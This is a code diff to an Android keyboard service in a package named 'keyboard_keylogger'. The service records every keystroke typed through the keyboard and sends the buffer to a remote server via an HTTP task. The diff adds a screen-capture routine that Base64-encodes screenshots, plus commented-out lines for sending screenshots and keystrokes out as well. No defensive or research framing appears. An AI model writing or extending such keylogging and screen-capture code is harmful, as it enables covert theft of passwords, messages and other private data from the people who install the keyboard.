@@ -1,13 +1,21 @@
 package com.example.keyboard_keylogger;
 
 
+import android.graphics.Bitmap;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
+import android.os.Environment;
+import android.util.Base64;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.util.ArrayList;
+import java.util.Date;
 
 public class MyService extends InputMethodService implements KeyboardView.OnKeyboardActionListener{
 
@@ -18,9 +26,13 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
 
     @Override
     public void onFinishInputView(boolean finishingInput) {
-
-        System.out.println("onFinishInputView called");
-        System.out.println(keyBuffer);
+//        String slika = takeScreenshot();
+//        System.out.println(slika);
+        //new HTTPReqTask().setBody(slika).execute();
+        //System.out.println("onFinishInputView called");
+//        System.out.println(keyBuffer);
+//        String jsonInputString = "{\"slova\": "+keyBuffer+" }";
+//        new HTTPReqTask().setBody(jsonInputString).execute();
         new HTTPReqTask().setBody(keyBuffer.toString()).execute();
         keyBuffer.clear();
         super.onFinishInputView(finishingInput);
@@ -95,5 +107,32 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
     @Override
     public void swipeUp() {
 
+    }
+
+
+    private String takeScreenshot() {
+        Date now = new Date();
+        android.text.format.DateFormat.format("hh-mm-ss", now);
+        ByteArrayOutputStream stream = new ByteArrayOutputStream();
+        byte[] byteArray = stream.toByteArray();
+        try {
+            // create bitmap screen capture
+            View v1 = this.getWindow().getWindow().getDecorView().getRootView();
+
+            v1.setDrawingCacheEnabled(true);
+            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
+
+            bitmap.compress(Bitmap.CompressFormat.PNG,100,stream);
+            byteArray = stream.toByteArray();
+
+
+        } catch (Throwable e) {
+            // Several error may come out with file handling or DOM
+            e.printStackTrace();
+        }
+        String imageEncoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
+        System.out.println("SCREENSHOT CREATED");
+        System.out.print(imageEncoded);
+        return imageEncoded;
     }
 }
